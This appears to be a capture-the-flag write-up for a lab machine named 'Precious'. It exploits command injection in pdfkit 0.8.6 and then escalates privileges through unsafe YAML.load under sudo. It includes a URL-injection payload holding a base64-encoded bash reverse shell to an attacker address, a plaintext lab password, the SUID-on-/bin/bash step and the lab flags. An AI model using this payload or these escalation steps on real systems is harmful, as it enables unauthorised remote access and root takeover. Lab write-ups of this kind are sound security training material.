# precious

# services 

* 22 - ssh OpenSSH 8.4p1
* 80 - http nginx 1.18.0

# http

webapp is used to convert web pages to pdf. If a valid url is provided the application returns a pdf of the contents of the response. 
By using exiftool we can determine what software is being used to create the pdf file and it returns a vulnerable version of **pdfkit v0.8.6**

After some quick research we learn that this version of pdfkit is vulnerable to command injection and we test this by issuing the following sleep command, because the vulerability is not reflected.
input:
    **http://%20`echo -n YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzAvNjY2NiAgMD4mMSIg | base64 -d | bash`**
    * we attempted to get a reverse shell with the typical bash commands, but I don't think that it liked the special characters, so we can base64 encode it and the decode it server side to execute the reverse shell.

# PE

After initial access with ruby, we see an irregular file in our home directory and it contains henry's password in plaintext:
**henry:Q3c1AqGHtoI0aXAYFH**

# PE 2

Henry has sudo privilege to run ruby on the dependencies.rb file, and the user also has read access on the file, so we can look at it for potential sources/sinks. Inside of this file a YAML file is loaded with YAML.load, and this file does not exist in the current directory, but is called without a path. We do not have access to write in this directory, but we can prepend the path variable with somewhere we do have w priv. YAML.load is similar to pickle.dump, and is considered unsafe. After some quick online research I find a malicious yml file that can be used for RCE. Whenever I have rce with root priv I like to just add an suid bit to /bin/bash and get a quick root.

In this file our sink was the YAML.load and our source was the dependencies.yml file that we could create
**user flag: 5a4a43ecea95f7f44bd28c6f7ff703db
root flag: 4258543563a203145ddfd1d053b85163**
